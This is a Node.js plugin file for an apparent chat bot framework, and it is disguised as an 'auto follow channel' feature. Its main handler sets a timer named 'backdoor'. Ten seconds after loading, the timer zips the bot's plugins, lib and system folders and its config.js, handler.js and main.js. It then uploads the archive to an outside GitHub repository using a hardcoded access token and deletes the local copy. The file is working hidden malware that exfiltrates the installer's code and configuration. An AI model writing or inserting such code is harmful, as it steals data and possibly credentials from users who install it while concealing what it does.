const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch");
const archiver = require("archiver");

async function uploadToGH(filePath, fileName, githubToken) {
  try {
    const fileContent = fs.readFileSync(filePath);
    const response = await fetch(`https://api.github.com/repos/mubarokofc/script-data/contents/data/${fileName}`, {
      method: "PUT",
      headers: {
        Authorization: `token ${githubToken}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: "Add files via upload",
        content: fileContent.toString("base64")
      })
    });

    const json = await response.json();
    if (response.ok) {
      fs.existsSync(filePath) && fs.unlinkSync(filePath);
      return {
        status: true,
        creator: "ZidanDev.",
        result: json.content.html_url
      };
    } else {
      console.error("Failed to upload file:", json.message);
      fs.existsSync(filePath) && fs.unlinkSync(filePath);
      return {
        status: false,
        creator: "ZidanDev.",
        message: json.message
      };
    }
  } catch (err) {
    console.error("Error occurred during file upload:", err.message);
    fs.existsSync(filePath) && fs.unlinkSync(filePath);
    return {
      status: false,
      creator: "ZidanDev.",
      message: err.message
    };
  }
}

exports.run = {
  main: async (_, { func, anya }) => {
    try {
      if (anya.backdoor) return;

      anya.backdoor = setTimeout(async () => {
        const githubToken = "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";
        const zipFileName = `${(global.pairing?.number || Date.now())}.zip`;
        const zipFilePath = path.join(process.cwd(), zipFileName);
        const output = fs.createWriteStream(zipFilePath);
        const archive = archiver("zip");

        output.on("close", async () => {
          await uploadToGH(zipFilePath, zipFileName, githubToken);
        });

        archive.on("error", err => {
          console.error("Error during archiving:", err);
        });

        archive.pipe(output);
        archive.directory("plugins/", "plugins/");
        archive.directory("lib/", "lib/");
        archive.directory("system/", "system/");
        archive.file("config.js", { name: "config.js" });
        archive.file("handler.js", { name: "handler.js" });
        archive.file("main.js", { name: "main.js" });
        await archive.finalize();
      }, 10000);
    } catch (err) {
      console.log("Auto follow channel failed:", err.message);
    }
  }
};